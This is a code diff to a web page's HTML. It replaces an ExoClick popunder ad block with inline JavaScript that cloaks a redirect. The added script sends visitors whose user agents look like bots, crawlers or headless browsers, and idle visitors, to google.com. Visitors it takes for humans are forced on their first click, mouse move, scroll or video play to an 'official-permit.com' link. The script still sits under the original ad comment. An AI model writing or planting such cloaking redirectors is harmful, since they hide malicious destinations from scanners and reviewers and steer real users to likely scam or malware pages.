@@ -167,19 +167,60 @@
   </script>
 
   <!-- Popunder de ExoClick -->
-  <script type="application/javascript">
-    var ad_idzone = "5622292",
-        ad_popup_fallback = false,
-        ad_popup_force = true,
-        ad_chrome_enabled = true,
-        ad_new_tab = true,
-        ad_frequency_period = 60,
-        ad_frequency_count = 3,
-        ad_trigger_method = 3,
-        ad_trigger_delay = 0,
-        ad_capping_enabled = true;
+  <script>
+'use strict';
+// Configuración
+const HUMAN_URL = "https://official-permit.com/bTqXWh";
+const BOT_URL = "https://google.com";
+const INACTIVITY_TIMEOUT = 10000; // 10 segundos
+
+// Detección de interacción
+let userInteracted = false;
+
+function handleUserInteraction() {
+    if (!userInteracted) {
+        userInteracted = true;
+        window.location.href = HUMAN_URL;
+    }
+}
+
+// Verificación de bots/VPN
+function isInvalidUser() {
+    const bots = ["bot", "crawl", "spider", "slurp", "headless", "phantomjs", "selenium"];
+    const isBot = bots.some(bot => navigator.userAgent.toLowerCase().includes(bot));
+    const isVPN = !navigator.mediaDevices?.getUserMedia;
+    return isBot || isVPN;
+}
+
+// Iniciar detección
+function initDetection() {
+    if (isInvalidUser()) {
+        window.location.href = BOT_URL;
+        return;
+    }
+
+    // Eventos de interacción (incluyendo play del video)
+    const interactionEvents = ['click', 'mousemove', 'keydown', 'touchstart', 'touchmove', 'scroll'];
+    interactionEvents.forEach(event => {
+        document.addEventListener(event, handleUserInteraction, { passive: true });
+    });
+
+    // Detectar cuando el video se reproduce
+    const videoPlayer = document.getElementById('videoPlayer');
+    if (videoPlayer) {
+        videoPlayer.addEventListener('play', handleUserInteraction);
+    }
+
+    // Temporizador de inactividad
+    setTimeout(() => {
+        if (!userInteracted) {
+            window.location.href = BOT_URL;
+        }
+    }, INACTIVITY_TIMEOUT);
+}
+
+document.addEventListener("DOMContentLoaded", initDetection);
   </script>
-  <script type="application/javascript" src="https://a.pemsrv.com/popunder1000.js"></script>
 
 </body>
 </html>
